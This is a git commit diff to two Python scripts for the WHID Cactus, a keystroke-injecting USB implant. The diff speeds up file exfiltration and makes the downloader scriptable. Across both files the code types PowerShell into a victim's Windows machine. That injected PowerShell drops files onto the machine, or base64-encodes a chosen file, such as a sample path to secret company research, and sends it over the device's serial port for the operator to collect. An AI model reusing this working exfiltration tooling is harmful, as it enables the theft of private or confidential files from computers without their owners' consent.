2bf79284d0c2c5400d1312d0a4529e942dbd1782
mark-b1980 <mark.b@post.cz>
2023-04-30 20:15:16 +0200

    Speed impovement, made downloader scriptable

--- Cactus WHID_Uploader.py
+++ Cactus WHID_Uploader.py
@@ -16,20 +16,24 @@ with open(file, "rb") as f:
 chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
 
 # Empty variable
-url = "http://192.168.1.1/runlivepayload"
-res = requests.post(url, data={"livepayload": 'PrintLine: $b64str=""', "livepayloadpresent": "1"})
+url = "http://192.168.1.1"
+
+# Open Powershell
+requests.post(f"{url}/runlivepayload", data={"livepayload": f'Press: 131+114\nDELAY: 1500\nPrintLine: powershell.exe', "livepayloadpresent": "1"})
+time.sleep(delay)
+
+# Initialize variable
+res = requests.post(f"{url}/runlivepayload", data={"livepayload": 'PrintLine: $b64str=""', "livepayloadpresent": "1"})
 time.sleep(delay)
 
 # Send file
 for i in range(len(chunks)):
     print(f"Sending chunk {i+1} / {len(chunks)} ", end ="")
 
-    res = requests.post(url, data={"livepayload": f'PrintLine: $b64str+="{chunks[i]}"', "livepayloadpresent": "1"})
+    res = requests.post(f"{url}/runlivepayload", data={"livepayload": f'PrintLine: $b64str+="{chunks[i]}"', "livepayloadpresent": "1"})
 
     print("... DONE")
     time.sleep(delay)
 
 # Write file to disk
-res = requests.post(url, data={"livepayload": f'PrintLine: [IO.File]::WriteAllBytes("{output_path}", [Convert]::FromBase64String($b64str))', "livepayloadpresent": "1"})
-time.sleep(delay)
-
+res = requests.post(f"{url}/runlivepayload", data={"livepayload": f'PrintLine: [IO.File]::WriteAllBytes("{output_path}", [Convert]::FromBase64String($b64str)); exit;', "livepayloadpresent": "1"})
--- Cactus_WHID_Downloader.py
+++ Cactus_WHID_Downloader.py
@@ -9,81 +9,102 @@ from requests.auth import HTTPBasicAuth
 
 creds = HTTPBasicAuth("admin", "hacktheplanet")
 url = "http://192.168.1.1"
-delay = 3
+chunk_length = 1200
+delay = 20
 
 def usage():
-    print(f"{__file__} [-r = resume running download]")
+    print(f"{__file__} [PATH] or [-r] (= receive finnished data)")
     quit()
 
 # CHECK CMD-LINE ARGS
 resume = False
-if len(sys.argv) > 2:
+if len(sys.argv) != 2:
     usage()
-elif len(sys.argv) == 2:
-    if sys.argv[1] != "-r":
-        usage()
-    else:
-        resume = True
 
-ts = time.time()
-
-# GET OR LOAD FILENAME
-if resume:
-    with open(".cactus.exfil", "r") as f:
-        file = f.read()
-else:
-    #file = "D:\Firmengeheimnisse\Geheimer_Forschungsbericht.pdf"
-    file = input("FILE-PATH> ").strip()
+# GET OR LOAD FILEPATH
+if sys.argv[1] != "-r":
+    file = sys.argv[1]
     with open(".cactus.exfil", "w") as f:
         f.write(file)
+else:
+    resume = True
+    estimate = 1
+    with open(".cactus.exfil", "r") as f:
+        file = f.read()
+    
 
 # DELETE EXFIL-FILE TO START FRESH
 if not resume:
     requests.get(f"{url}/deletepayload/yes?payload=/SerialEXFIL.txt")
 
-# INITIALISATION AND DETECTION OF THE PORT
-to_send = '$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace "root\CIMV2" -Filter "PNPDeviceID like \'%VID_1b4f&PID_9208%\'").Caption;'
-to_send += '$com=[regex]::match($s,\'COM([0-9]+)\').Value;'
-to_send += '$WHIDport= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one;'
-to_send += 'echo "" > $env:TEMP\\tmp; echo "" > $env:TEMP\\tmp2; '
+    # START EXTRACTION OF FILE
+    # Detection and initialisation of the port
+    to_send = '$s=(Get-WmiObject -Class Win32_PnPEntity -Namespace "root\CIMV2" -Filter "PNPDeviceID like \'%VID_1b4f&PID_9208%\'").Caption;'
+    to_send += '$com=[regex]::match($s,\'COM([0-9]+)\').Value;'
+    to_send += '$WHIDport= new-Object System.IO.Ports.SerialPort $com,38400,None,8,one;'
+    to_send += 'echo "" > $env:TEMP\\tmp; echo "" > $env:TEMP\\tmp2; '
 
-# DOWNLOAD FILE
-to_send += f'$res = [convert]::ToBase64String((Get-Content -Path "{file}" -Encoding byte)); '
-# Split into 100 byte chunks
-to_send += '$res -Split "(.{100})" | ?{$_} > $env:TEMP\\tmp; echo "!!!END!!!" >> $env:TEMP\\tmp; '
-# Convert to UTF8
-to_send += '$chunks = Get-Content $env:TEMP\\tmp; $chunks | Set-Content -Encoding "ascii" $env:TEMP\\tmp; '
-# Send code
-to_send += '$WHIDport.open(); '
-to_send += 'foreach($line in Get-Content $env:TEMP\\tmp){ $WHIDport.WriteLine("SerialEXFIL:$line"); Start-Sleep -Milliseconds 1750; } '
-to_send += '$WHIDport.Close(); exit;'
-# Send command to PC
-if not resume:
+    # Read file
+    to_send += f'$res = [convert]::ToBase64String((Get-Content -Path "{file}" -Encoding byte)); '
+    # Split into chunks
+    to_send += '$res -Split "(.{'+str(chunk_length)+'})" | ?{$_} > $env:TEMP\\tmp; '
+    # Convert to ASCII
+    to_send += '$chunks = Get-Content $env:TEMP\\tmp; $chunks | Set-Content -Encoding "ascii" $env:TEMP\\tmp; '
+    # Open Port
+    to_send += '$WHIDport.open(); '
+    # Count chunks and send
+    to_send += '$i=0; foreach($line in Get-Content $env:TEMP\\tmp){ $i++; } $WHIDport.WriteLine("SerialEXFIL:$i"); ';
+
+    # Send commands to PC
     requests.post(f"{url}/runlivepayload", data={"livepayload": f'Press: 131+114\nDELAY: 1500\nPrintLine: powershell.exe', "livepayloadpresent": "1"})
-    time.sleep(delay * 2)
+    time.sleep(5)
     requests.post(f"{url}/runlivepayload", data={"livepayload": f'PrintLine: {to_send}', "livepayloadpresent": "1"})
-    time.sleep(delay)
+    time.sleep(5)
+
+    # Get number of chunks
+    chunks = 0
+    while chunks == 0:
+        res = requests.get(f"{url}/SerialEXFIL.txt", auth=creds).text
+        try:
+            chunks = int(res)
+        except KeyboardInterrupt:
+            quit()
+        except:
+            chunks = 0
+            time.sleep(3)
+    
+    # Clear exfiltration file
+    requests.get(f"{url}/deletepayload/yes?payload=/SerialEXFIL.txt")
+    time.sleep(2)
+
+    # Calculate est. length
+    estimate = int((chunks * 1.4))
+    print(f"Need to send {chunks} chunks - this will take {int(estimate / 60)} minutes!")
+
+    # Run exfiltration
+    to_send = '$i=2000; foreach($line in Get-Content $env:TEMP\\tmp){ Start-Sleep -Milliseconds $i; $WHIDport.WriteLine("SerialEXFIL:$line"); $i=600; } '
+    to_send += '$WHIDport.Close(); exit;'
+    requests.post(f"{url}/runlivepayload", data={"livepayload": f'PrintLine: {to_send}', "livepayloadpresent": "1"})
+    print("LET THE WHID CACTUS DO IT's JOB - DONT USE IT TILL THE ESTIMATED TIME HAS PASSED!!!")
+
 
 # RECEIVE DATA
+time.sleep(estimate)
 res = ""
-while "!!!END!!!" not in res:
-    try:
-        res = requests.get(f"{url}/SerialEXFIL.txt", auth=creds).text
-        print(f"Got {len(res)} bytes", end="\r", flush=True)
-        if "SerialEXFIL:" in res:
-            print("ERROR - TIMING ISSUE WHILE EXPORTING")
-            quit()
-        time.sleep(delay + int(len(res) / 100000))
-    except KeyboardInterrupt:
-        quit()
-    except:
-        res = ""
-        
-# REMOVE BYTE COUNTER
-print()
+try:
+    res = requests.get(f"{url}/SerialEXFIL.txt", auth=creds, timeout=25).text
+    print(f"Got {len(res)} bytes")
+
+    tmp = res.replace("\r", "").split("\n")
+    for e in tmp[:-2]:
+        if len(e) != chunk_length:
+            print("ERROR - DATA IST DAMAGED")
+            raise ValueError
+except:
+    quit()
         
 # DECODE BASE64 AND SAVE
-b64 = res.replace("!!!END!!!", "").replace("\r", "").replace("\n", "").strip().encode("ascii")
+b64 = res.replace("\r", "").replace("\n", "").strip().encode("ascii")
 byte_arr = base64.b64decode(b64)
 
 # WRITE FILE
@@ -93,4 +114,4 @@ if os.path.isfile(filename):
 with open(filename, "wb") as f:
     f.write(byte_arr)
 
-print(f"FILE {filename} ({len(byte_arr)} bytes) RECEIVED IN {time.time() - ts} SEC.")
+print(f"FILE {filename} ({len(byte_arr)} bytes) RECEIVED")
